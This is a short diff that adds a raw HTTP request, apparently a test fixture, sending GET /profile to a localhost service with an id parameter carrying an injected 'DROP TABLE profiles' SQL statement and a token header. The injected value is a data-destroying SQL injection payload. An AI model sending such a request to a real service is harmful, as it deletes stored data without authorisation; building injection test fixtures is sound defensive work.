@@ -1,0 +1,3 @@
+GET /profile?id=1;DROP%20TABLE%20profiles;-- HTTP/1.1
+Host: 127.0.0.1:8068
+X-Token: 986540d7d9614674988fdfca6c231260
